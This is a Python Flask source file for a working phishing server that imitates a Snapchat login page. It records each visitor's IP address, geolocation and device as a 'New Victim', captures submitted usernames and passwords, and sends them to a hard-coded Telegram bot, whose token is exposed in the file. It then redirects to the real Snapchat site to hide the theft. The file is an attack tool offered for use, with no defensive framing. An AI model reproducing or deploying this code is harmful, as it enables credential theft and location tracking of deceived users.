from flask import Flask, request, render_template, redirect
import requests, json, datetime, os

app = Flask(__name__)

TG_TOKEN = "8827805292:AAHGRs48taMkP6taoqw5lUEOTl2n5HWIpp0"
TG_CHAT  = "7679717433"

def send_telegram(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
            json={"chat_id": TG_CHAT, "text": text, "parse_mode": "Markdown"},
            timeout=5
        )
    except:
        pass

def get_geo(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,query", timeout=5)
        return r.json()
    except:
        return {}

@app.route("/")
def home():
    return redirect("/snap")

@app.route("/snap")
def snap():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
    ua = request.headers.get("User-Agent", "?")
    geo = get_geo(ip)
    msg = (
        f"New Victim\n"
        f"IP: {ip}\n"
        f"Location: {geo.get('city','?')}, {geo.get('country','?')}\n"
        f"ISP: {geo.get('isp','?')}\n"
        f"Device: {ua[:80]}"
    )
    send_telegram(msg)
    return render_template("snap.html")

@app.route("/snap/login", methods=["POST"])
def snap_login():
    u = request.form.get("username", "?")
    p = request.form.get("password", "?")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
    geo = get_geo(ip)
    msg = (
        f"Credentials Captured\n"
        f"User: {u}\n"
        f"Pass: {p}\n"
        f"IP: {ip}\n"
        f"Location: {geo.get('city','?')}, {geo.get('country','?')}"
    )
    send_telegram(msg)
    return redirect("https://www.snapchat.com/", code=302)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
